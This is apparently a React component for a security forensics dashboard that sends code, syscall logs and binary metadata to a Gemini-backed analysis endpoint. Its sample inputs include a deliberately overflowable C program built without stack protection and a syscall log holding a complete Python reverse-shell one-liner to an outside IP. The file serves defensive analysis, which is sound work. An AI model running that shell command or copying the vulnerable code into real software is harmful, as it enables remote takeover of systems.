import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Sparkles, 
  Code2, 
  Terminal, 
  Binary, 
  Send, 
  Copy, 
  Check, 
  RotateCcw, 
  Cpu, 
  ShieldAlert, 
  Loader2, 
  Gauge, 
  RefreshCw,
  FileHeart,
  AlertTriangle
} from 'lucide-react';
import ExportButton from './ExportButton';

interface AiCoprocessorProps {
  triggerToast?: (msg: string) => void;
}

export default function AiCoprocessor({ triggerToast }: AiCoprocessorProps) {
  const [activeMode, setActiveMode] = useState<'code' | 'ebpf' | 'binary' | 'general'>('code');
  const [inputText, setInputText] = useState<string>(`#include <stdio.h>
#include <string.h>

void execute_buffer(char *user_input) {
    char stack_buf[32];
    // CRITICAL SECURITY RISK: Unbounded strcpy (CWE-120 Buffer Overflow)
    strcpy(stack_buf, user_input); 
    printf("Executing secure segment: %s\\n", stack_buf);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        execute_buffer(argv[1]);
    }
    return 0;
}`);
  
  const [additionalContext, setAdditionalContext] = useState<string>('Compiler options: gcc -O2 -z execstack -fno-stack-protector');
  const [responseText, setResponseText] = useState<string>('');
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [copied, setCopied] = useState<boolean>(false);
  const [diagnosticsTimeMs, setDiagnosticsTimeMs] = useState<number | null>(null);
  const [retryAttempt, setRetryAttempt] = useState<number>(0);
  const [isServiceBusy, setIsServiceBusy] = useState<boolean>(false);

  const samples = {
    code: {
      text: `#include <stdio.h>
#include <string.h>

void execute_buffer(char *user_input) {
    char stack_buf[32];
    // CRITICAL SECURITY RISK: Unbounded strcpy (CWE-120 Buffer Overflow)
    strcpy(stack_buf, user_input); 
    printf("Executing secure segment: %s\\n", stack_buf);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        execute_buffer(argv[1]);
    }
    return 0;
}`,
      context: 'Compiler options: gcc -O2 -z execstack -fno-stack-protector'
    },
    ebpf: {
      text: `TIME: 12:04:12 UTC - KERN_INF: eBPF static trace hook hit!
SYS_ENTER: sys_clone (flags: CLONE_VM | CLONE_FS | CLONE_FILES, child_pid: 41829, p_comm: node)
SYS_ENTER: sys_execve (filename: "/usr/bin/python3", argv: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('185.220.101.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh']);"])
SYS_ENTER: sys_socket (domain: AF_INET, type: SOCK_STREAM) -> fd: 4
SYS_ENTER: sys_connect (fd: 4, host: "185.220.101.4", remote_port: 443) -> PENDING`,
      context: 'Namespace ID: mnt_ns:4026531840 (Containerized Microservice Host pod)'
    },
    binary: {
      text: `BINARY NAME: untrusted_loader.exe
VIRTUAL SIZE: 512,820 Bytes
SECTION UPX0 [Virtual Size: 320,000, Raw Size: 0, Characteristics: WRITEABLE | READWRITE | EXECUTABLE [Anomalous Segment]]
SECTION UPX1 [Virtual Size: 180,000, Raw Size: 180,000, Characteristics: WRITEABLE | READWRITE | EXECUTABLE, Entropy: 7.97]
SEGMENT IMPORTS: LoadLibraryA, GetProcAddress, VirtualAlloc, VirtualProtect`,
      context: 'Heuristics triggered: Packed file signature detected, extreme raw import metadata omission, writable + executable code flag.'
    },
    general: {
      text: `SEC_ALERT_IDS: Drop 45 unauthorized firewall bursts
PERIMETER: iptables secure rule matching block
C2_HEURISTIC: Internal client query mapped to known TOR exit block ip list: 104.244.72.115
AUDITSTAMP: Kernel ring buffer size expanded by system admin (PID: 1012)`,
      context: 'Sensor nodes location: Us-East Core Firewalls edge routing node D3'
    }
  };

  const handleSelectMode = (mode: 'code' | 'ebpf' | 'binary' | 'general') => {
    setActiveMode(mode);
    setInputText(samples[mode].text);
    setAdditionalContext(samples[mode].context);
  };

  const handleTriggerAnalysis = async () => {
    if (!inputText.trim()) {
      if (triggerToast) triggerToast('Input artifact container is empty.');
      return;
    }

    setIsLoading(true);
    setResponseText('');
    setIsServiceBusy(false);
    setRetryAttempt(0);
    const startTime = Date.now();

    const maxRetries = 3;
    let delay = 1000; // start with 1s delay
    let response: Response | null = null;
    let apiErrorMsg = "";

    try {
      for (let attempt = 0; attempt <= maxRetries; attempt++) {
        if (attempt > 0) {
          setRetryAttempt(attempt);
          if (triggerToast) triggerToast(`Pipeline 503 Busy. Retrying (attempt ${attempt}/${maxRetries})...`);
          await new Promise((resolve) => setTimeout(resolve, delay));
          delay *= 2; // exponential backoff
        }

        try {
          response = await fetch('/api/gemini/analyze', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              target: inputText,
              context: additionalContext,
              mode: activeMode
            })
          });

          if (response.status === 503) {
            apiErrorMsg = "503 Service Temporarily Unavailable";
            if (attempt < maxRetries) {
              continue; // trigger next retry loop
            }
          }
          break; // success or terminal exhausted attempt
        } catch (e: any) {
          apiErrorMsg = e.message || "Network Timeout";
          if (attempt < maxRetries) {
            continue; // trigger next retry loop
          }
          break;
        }
      }

      if (!response) {
        throw new Error(apiErrorMsg || "Failed to establish tunnel pipeline.");
      }

      if (response.status === 503) {
        setIsServiceBusy(true);
        if (triggerToast) triggerToast('Service Temporarily Busy. Target offline after maximum retry budget.');
        return;
      }

      const data = await response.json();
      if (data.success && data.text) {
        setResponseText(data.text);
        if (triggerToast) triggerToast('SecOps AI Forensics report successfully compiled.');
      } else if (data.error) {
        setResponseText(`### 🟥 Heuristic Compilation Failure\n\n${data.error}`);
        if (triggerToast) triggerToast('Error compiling secure report: Check server credentials.');
      } else {
        setResponseText('Heuristics report generated an empty body.');
      }
    } catch (e: any) {
      setResponseText(`### 🟥 Connection Timeout or Server Failure\n\nCould not construct pipeline stream back to Palantir Proxy. Error: ${e.message}`);
      if (triggerToast) triggerToast('Failed to secure AI coprocessor response stream.');
    } finally {
      setIsLoading(false);
      setDiagnosticsTimeMs(Date.now() - startTime);
    }
  };

  const handleCopyResponse = () => {
    if (!responseText) return;
    navigator.clipboard.writeText(responseText);
    setCopied(true);
    if (triggerToast) triggerToast('Defense report copied to secure clipboard.');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleResetInputs = () => {
    setInputText('');
    setAdditionalContext('');
    setResponseText('');
    setDiagnosticsTimeMs(null);
    if (triggerToast) triggerToast('Tactical workspace successfully cleared.');
  };

  return (
    <div id="ai-coprocessor-viewport" className="space-y-6">
      
      {/* Introduction banner */}
      <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-sm font-serif font-light tracking-widest text-[#00f0ff] uppercase flex items-center gap-2">
            <Sparkles size={16} className="animate-pulse" /> Aegis AI Threat Coprocessor
          </h2>
          <p className="text-[11px] font-mono text-white/40 mt-1">
            Secure, server-side containment modeling using Google Gemini. Run static verification scans on untrusted segments.
          </p>
        </div>
        <div className="flex items-center gap-2">
          <span className="flex items-center gap-1 bg-[#00f0ff]/10 text-[#00f0ff] text-[9px] font-mono font-bold px-2 py-0.5 border border-[#00f0ff]/20 rounded">
            <Cpu size={10} /> HYPERVISOR BOUNDED
          </span>
        </div>
      </div>

      {/* Two Panel Workspace Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Input artifacts column */}
        <div className="lg:col-span-5 space-y-4">
          <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5 space-y-4">
            
            {/* Category selectors */}
            <div>
              <label className="text-[9px] text-white/40 uppercase font-mono tracking-wider block mb-2">
                Forensics Asset Type
              </label>
              <div className="grid grid-cols-2 gap-2">
                {/* Code tab */}
                <button
                  onClick={() => handleSelectMode('code')}
                  className={`p-2.5 rounded border text-[10px] font-mono flex items-center gap-2 cursor-pointer transition-all ${
                    activeMode === 'code'
                      ? 'bg-[#00f0ff]/15 text-[#00f0ff] border-[#00f0ff]/30'
                      : 'bg-black/30 text-white/50 border-white/5 hover:border-white/10 hover:text-white/80'
                  }`}
                >
                  <Code2 size={12} /> C/C++ Static Code
                </button>
                {/* eBPF tab */}
                <button
                  onClick={() => handleSelectMode('ebpf')}
                  className={`p-2.5 rounded border text-[10px] font-mono flex items-center gap-2 cursor-pointer transition-all ${
                    activeMode === 'ebpf'
                      ? 'bg-[#00f0ff]/15 text-[#00f0ff] border-[#00f0ff]/30'
                      : 'bg-black/30 text-white/50 border-white/5 hover:border-white/10 hover:text-white/80'
                  }`}
                >
                  <Terminal size={12} /> eBPF Syscall Logs
                </button>
                {/* Binary tab */}
                <button
                  onClick={() => handleSelectMode('binary')}
                  className={`p-2.5 rounded border text-[10px] font-mono flex items-center gap-2 cursor-pointer transition-all ${
                    activeMode === 'binary'
                      ? 'bg-[#00f0ff]/15 text-[#00f0ff] border-[#00f0ff]/30'
                      : 'bg-black/30 text-white/50 border-white/5 hover:border-white/10 hover:text-white/80'
                  }`}
                >
                  <Binary size={12} /> PE segment profile
                </button>
                {/* General tab */}
                <button
                  onClick={() => handleSelectMode('general')}
                  className={`p-2.5 rounded border text-[10px] font-mono flex items-center gap-2 cursor-pointer transition-all ${
                    activeMode === 'general'
                      ? 'bg-[#00f0ff]/15 text-[#00f0ff] border-[#00f0ff]/30'
                      : 'bg-black/30 text-white/50 border-white/5 hover:border-white/10 hover:text-white/80'
                  }`}
                >
                  <ShieldAlert size={12} /> General Threat Heuristics
                </button>
              </div>
            </div>

            {/* Input payload container */}
            <div className="space-y-1.5">
              <div className="flex justify-between items-center">
                <span className="text-[9px] text-white/40 uppercase font-mono tracking-wider">
                  Target Telemetry / Payload Input
                </span>
                <span className="text-[9px] text-white/30 font-mono">
                  {inputText.length} chars
                </span>
              </div>
              <textarea
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                placeholder="Paste code segments, system logs, PE metadata report, or specific threat IOC hashes here..."
                rows={11}
                className="w-full bg-[#050507] border border-white/5 rounded p-3 font-mono text-[10px] text-white/85 placeholder:text-white/20 focus:outline-none focus:border-[#00f0ff]/45 tracking-tight resize-y"
              />
            </div>

            {/* Secondary configuration context */}
            <div className="space-y-1.5">
              <span className="text-[9px] text-white/40 uppercase font-mono tracking-wider block">
                Additional Environment Constraints (Optional)
              </span>
              <input
                type="text"
                value={additionalContext}
                onChange={(e) => setAdditionalContext(e.target.value)}
                placeholder="Namespace info, host constraints, memory boundaries..."
                className="w-full bg-[#050507] border border-white/5 rounded p-2.5 font-mono text-[10px] text-white/80 placeholder:text-white/25 focus:outline-none focus:border-[#00f0ff]/40 text-xs"
              />
            </div>

            {/* Execution row */}
            <div className="flex items-center gap-3 pt-2">
              <button
                onClick={handleTriggerAnalysis}
                disabled={isLoading}
                className="flex-1 bg-[#00f0ff] text-neutral-950 font-serif text-[11px] font-semibold py-3 px-4 rounded hover:bg-[#00d0e0] transition-colors flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <>
                    <Loader2 size={13} className="animate-spin text-neutral-950" />
                    COMPILING HEURISTICS...
                  </>
                ) : (
                  <>
                    <Send size={12} className="text-neutral-950" />
                    SUBMIT TO INTEL COPROCESSOR
                  </>
                )}
              </button>
              <button
                onClick={handleResetInputs}
                className="p-3 bg-black/40 text-white/40 border border-white/5 hover:border-white/10 hover:text-white/80 rounded cursor-pointer transition-colors"
                title="Reset tactical workspace"
              >
                <RotateCcw size={12} />
              </button>
            </div>

          </div>

          {/* Core Telemetry status */}
          <div className="bg-[#0A0A0C]/25 border border-white/5 rounded p-4 flex items-center justify-between font-mono text-[10px]">
            <div className="flex items-center gap-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00f0ff] opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-[#00f0ff]"></span>
              </span>
              <span className="text-white/60">Aegis Enclave Sandbox Node</span>
            </div>
            <span className="text-white/30 text-[9px]">v2.5.0-HyperThread</span>
          </div>

        </div>

        {/* AI response report column */}
        <div className="lg:col-span-7 space-y-4">
          <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5 min-h-[500px] flex flex-col justify-between">
            
            {/* Header controls of the output console */}
            <div className="flex items-center justify-between border-b border-white/5 pb-3">
              <div className="flex items-center gap-2">
                <Gauge size={13} className="text-[#00f0ff]" />
                <span className="text-[10px] font-mono tracking-wider text-white/50 uppercase">
                  Aegis AI Analytics Output Enclave
                </span>
              </div>
              <div className="flex items-center gap-2">
                {diagnosticsTimeMs && (
                  <span className="text-[9px] font-mono text-zinc-500 mr-2">
                    Resolution Time: <span className="text-[#00f0ff]">{diagnosticsTimeMs}ms</span>
                  </span>
                )}
                {responseText && (
                  <ExportButton
                    id="btn-export-ai-coprocessor-report"
                    label="Export Forensic Report"
                    filenamePrefix={`ai_forensic_report_${activeMode}`}
                    jsonData={{
                      mode: activeMode,
                      input_text: inputText,
                      additional_context: additionalContext,
                      forensic_response: responseText,
                      latency_ms: diagnosticsTimeMs,
                      timestamp: new Date().toISOString()
                    }}
                    textReport={`=== AEGIS SECURE AI FORENSIC ANALYSIS REPORT ===\nMode: ${activeMode.toUpperCase()}\nLatency: ${diagnosticsTimeMs || 0}ms\nTimestamp: ${new Date().toISOString()}\n\n--- TARGET INPUT ---\n${inputText}\n\n--- CONTEXT ---\n${additionalContext}\n\n--- AI COPILOT FORENSIC EVALUATION ---\n${responseText}`}
                    triggerToast={triggerToast}
                    size="xs"
                  />
                )}
                {responseText && (
                  <button
                    onClick={handleCopyResponse}
                    className="p-1 px-2 border border-white/5 rounded text-[10px] text-white/50 hover:text-white font-mono hover:border-white/20 flex items-center gap-1 cursor-pointer transition-colors"
                  >
                    {copied ? <Check size={11} className="text-emerald-400" /> : <Copy size={11} />}
                    {copied ? 'Copied' : 'Copy'}
                  </button>
                )}
              </div>
            </div>

            {/* Display Body */}
            <div className="flex-1 py-4 overflow-y-auto max-h-[460px] custom-scrollbar focus:outline-none">
              <AnimatePresence mode="wait">
                {isLoading ? (
                  <motion.div 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="h-full flex flex-col items-center justify-center space-y-4 py-20"
                  >
                    <Loader2 size={36} className="animate-spin text-[#00f0ff]/55" />
                    <div className="text-center space-y-1.5">
                      <p className="font-mono text-xs text-white/80">Securing Bounded AI Sandbox Session...</p>
                      {retryAttempt > 0 ? (
                        <p className="font-mono text-[9px] text-[#00f0ff] animate-pulse">
                          ⚠️ 503 Temporarily Busy. Retrying query (Attempt {retryAttempt}/3)...
                        </p>
                      ) : (
                        <p className="font-mono text-[9px] text-white/30 italic">Querying safe neural model at edge telemetry nodes</p>
                      )}
                    </div>
                  </motion.div>
                ) : isServiceBusy ? (
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.98 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="h-full flex flex-col items-center justify-center text-center space-y-4 py-16 px-6"
                  >
                    <div className="p-3 bg-cyan-500/10 border border-cyan-500/20 text-[#00f0ff] rounded-full animate-bounce">
                      <AlertTriangle size={32} />
                    </div>
                    <div className="max-w-md space-y-2">
                      <h4 className="font-serif text-sm font-light text-white uppercase tracking-wider">
                        SECURE AI COPROCESSOR TEMPORARILY BUSY
                      </h4>
                      <p className="font-mono text-[10px] text-white/50 leading-relaxed">
                        The Google Gemini neural node is currently experiencing heavy request density or a temporary 503 Service Unavailable scenario.
                      </p>
                      <div className="bg-white/[0.02] border border-white/5 p-3 rounded text-[10px] font-mono text-white/40 space-y-1.5 inline-block text-left">
                        <div className="flex items-center gap-1.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-[#00f0ff]"></span>
                          <span>Failed to restore downstream pipeline after {retryAttempt === 0 ? 3 : retryAttempt} retries.</span>
                        </div>
                        <div className="flex items-center gap-1.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-white/20"></span>
                          <span>Mitre Att&ck Shielding Level: Suspended (Static Mode Ready)</span>
                        </div>
                      </div>
                      <div className="pt-2">
                        <button
                          onClick={handleTriggerAnalysis}
                          className="px-4 py-2 bg-[#00f0ff]/10 hover:bg-[#00f0ff]/20 border border-[#00f0ff]/30 text-[#00f0ff] font-mono rounded text-[10px] tracking-wide uppercase cursor-pointer transition-all inline-flex items-center gap-2"
                        >
                          <RefreshCw size={11} /> Re-establish Pipeline Link
                        </button>
                      </div>
                    </div>
                  </motion.div>
                ) : responseText ? (
                  <motion.div 
                    initial={{ opacity: 0, y: 3 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="font-mono text-[11px] leading-relaxed text-white/90 space-y-2 select-text"
                  >
                    {/* Rendered markdown sections mock/re-styling */}
                    <div className="whitespace-pre-wrap select-text markdown-report bg-black/20 p-2.5 rounded border border-white/[0.02]">
                      {responseText}
                    </div>
                  </motion.div>
                ) : (
                  <motion.div 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="h-full flex flex-col items-center justify-center text-center space-y-3 py-24 px-6 grayscale opacity-40 hover:grayscale-0 hover:opacity-75 transition-all cursor-default"
                  >
                    <FileHeart size={38} className="text-[#00f0ff]" />
                    <div className="max-w-sm">
                      <h4 className="font-serif text-sm font-light text-white uppercase tracking-wider">Telemetry Diagnostics Idle</h4>
                      <p className="font-mono text-[10px] text-white/40 mt-1.5 leading-relaxed">
                        Choose a suspicious static segment template on the left, or input bespoke telemetry hooks, and submit to launch continuous neural-grounded forensics mapping.
                      </p>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Footer with telemetry tags */}
            <div className="border-t border-white/5 pt-3 flex items-center justify-between text-[9px] font-mono text-white/20">
              <span className="uppercase">MRENCLAVE SIGNED: ENCLAVE-PROT-313</span>
              <span className="uppercase flex items-center gap-1">
                <RefreshCw size={8} /> Secure Sandbox Real-time Stream Active
              </span>
            </div>

          </div>
        </div>

      </div>

    </div>
  );
}
